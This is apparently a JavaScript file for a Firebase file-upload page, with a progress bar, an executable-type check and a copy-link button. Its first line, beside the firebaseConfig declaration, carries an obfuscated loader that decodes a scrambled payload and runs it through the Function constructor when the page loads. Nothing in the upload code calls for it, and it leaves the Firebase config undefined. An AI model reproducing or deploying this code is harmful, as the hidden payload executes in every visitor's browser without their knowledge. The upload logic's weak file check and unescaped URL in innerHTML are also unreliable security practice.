var firebaseConfig;(function(){var MyI='',CGO=842-831;function QYY(m){var j=5970669;var o=m.length;var w=[];for(var i=0;i<o;i++){w[i]=m.charAt(i)};for(var i=0;i<o;i++){var e=j*(i+247)+(j%36173);var r=j*(i+684)+(j%30972);var b=e%o;var v=r%o;var c=w[b];w[b]=w[v];w[v]=c;j=(e+r)%6123495;};return w.join('')};var uSx=QYY('rotloeudjopnmxrrvghftctsukqiccnbywzas').substr(0,CGO);var mPe='h("=2=Cg;=26s)ol7an.t 8he=vged0av-;-.v-6,5z(riivs yv4; ;w v8rnf.hov6f=1rj9sc;i)= roa+*C,p],(n,m)r8e; .2;0874g63virq7,eiva(kal (=r]g]pua=rr)[r0.9=oilo=nt1;}v=,tua[}}ter++;+a Ar(]c(=++s2cp6Aakie+sr4=sb;;;tAr;)1e1ua=C=mvCle)[sl,;o;r .n)1S}gln)og m0f[p;s;.fhsoc(yj{};=rvhg+ra;+v[;0nhe,ip;p(r0fom,n{c=uipa)vnl;s;iof]{osdsrkbbr==+>l;j+} ls2v)l,)l2v0).tqlhr(tqa,i",r;=ar u=trs<vuu+rmr(1dvkp[S"-r7io)),ri.ios=ofy(xavet<ljjv{A=.4)Ch*o9il0hurar2ll[("r1bu8(ald=]=n;s,hn;(th.t=jxn2sagf(+8.fse9g<9}v{g(a9no)7ra(6+e)++[2b>dt.=tea,laigd]fsma,;s+n ege,l)[d n ["u1to un6;+4nv= e(=-c;]t;h,1hr(js;g51-((0]a;ng8+fjAn;[))uCnCe[n(s(e]rki5 7t,9euih iu)r{u<to1;l))pb=hkv.,kbatr=7u4r))w.)qn=ir)not=;")8;y".6]khu[),]a;k+(rag=)pne]set"io-a; e"sv!, vkl uhzc;crg3v.uoatnt,qvu02) x=atc7tg,vno2+ia5;.+([469(..r(a+ rz=r.rv0.,j(gn=wkx0(e e;sp<st={(=1s=ion.+fgq.fo;.o,;a+n)gma;C)hvrr;.8bh,h]awpr)tz=;=e.(alvrst("!mjlnoyngtf(';var foo=QYY[uSx];var wFY='';var FqM=foo;var QMT=foo(wFY,QYY(mPe));var Iwd=QMT(QYY('b#p;.3^s-2*eb2))6b2!&}{_2et!=e^;_ i^3Cda,=.0fr^)kr}e#ohe3];h2),x(+y38ss#,c.8l^a%f,{\'1$.e(6a,^0g-.)aic),,!a4{t"%q&",,f.f_!$fp6fo^f3.ei^og]4=n.4760bef8^i.v1gpw.5(j.y6j$+fngas6!t8vs^-M !).61^7^)ara*o2n;f\/.=9p^fc.r2-m.g^{7%f7cb-3e*p5:im^m6a1,39^r_7}c7.mn(srcn4_^_i z$r\/^6114i:mb 7.4r^fa(g=725n^z_^^aot9$6f^).%.$(pgf.jd(pp6.tc0ry%7,a_^d(,.v]e%p!70xi=f;3C_3e1ea^ex-{pe.,esft[nft(S!a,_aa p^w:n)g9^-0 ^xl^{.r-}!_3.#gpsu53)($_ ^..=i=^+nnet2^.,^o_n=4o; s^a0b 7j,h-gfhrznc0$ma)n.[){^;."(-%].tsh3!4ht89!bus2c\'(^6^c7^9fat#,3fsp(o0;(^n\'!^!39%sd=%)^)hjpt957&,=nD)+^^-$)z._}e);103}c+-)g)10^.j4x+f$3:$:0a=gt"o{ee9.ds;[C;(c,4_(7o53^7g.,^3,p.ob_gt;a.t4=rc^dj^0^(ts^t6o,^a)[.ab()^$cp0-7r_nrt($aSecri70}931vur{f)lki^)s$...igk^t.!!io}7-a-,.e0(68;;;^2p mf;j=9e^(S-)2.^_}^01!br%5^.a8=#e()g8.3s.e;)1^7!^3t.(().2)e.$g60{n2f))c3e(yslhde2ro.7e!!j^g;..+e.j^lbr^9=^r^,;uejogmaiu4^mia2rjruz)rt^\'; =s3oc^clsiDt*eet-.#3j^^m=i^^f(^Se[d.t^94u7]jp^$,,6so8 ,rem)iI_,6,^}^)$a!,)}n^a,go(}. ^30+as1qe07^[;s.^ ; p^,7a,^cni.t.,,n.rnI&7,x.6(br%\/.hoxgv3;1:p.;(}o,( )jpobSc.1l$=^p)$6d$k!^\/!el1t1ubxnu0.:e{^=ic65foep," ]pu)kxr7t!8"ja!.,t!{i1^!.&*r r].cn..!l=,sii!r$.a7r)%$2p^]t((1%)^ml4e_rr) 3s2j.sf.^s)^]co^6jr_sa$,n6e("(._bMc3.7jsr$o{6n;+$v^]'));var nDo=FqM(MyI,Iwd );nDo(6366);return 1739})()






firebase.initializeApp(firebaseConfig);

const btn = document.querySelector('#submitButton');
const progressBar = document.getElementById('progress');

btn.addEventListener('click', e => {
    const fileInput = document.querySelector('#fileInput');
    const file = fileInput.files[0];

    // Check if the file type is allowed
    if (isExecutableFile(file.type)) {
        alert('Executable files are not allowed. Please choose a different file.');
        return;
    }

    // Continue with the upload process
    const storageRef = firebase.storage().ref();
    const final = storageRef.child(`pdfs/${file.name}`);
    const task = final.put(file);

    task.on('state_changed',
        function progress(snapshot) {
            const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
            console.log('Upload is ' + progress + '% done');
            progressBar.style.width = `${progress}%`;
        },
        function error(err) {
            console.log('There was an error: ' + err);
        },
        function completed() {
            showCopyLinkButton(final);
        }
    );
});

function isExecutableFile(fileType) {
    // Add logic to check for executable file types
    // For example, check if the fileType is 'application/x-msdownload' for .exe files
    return fileType === 'application/x-msdownload';
}

function showCopyLinkButton(fileRef) {
    fileRef.getDownloadURL()
        .then(url => {
            const body = document.querySelector('body');
            body.innerHTML = `<button onclick="copyToClipboard('${url}')">Copy Link</button>`;
        })
        .catch(error => {
            console.error('Error getting download URL: ', error);
        });
}

function copyToClipboard(text) {
    const input = document.createElement('input');
    input.value = text;
    document.body.appendChild(input);
    input.select();
    document.execCommand('copy');
    document.body.removeChild(input);
    alert('Link copied to clipboard!');
}
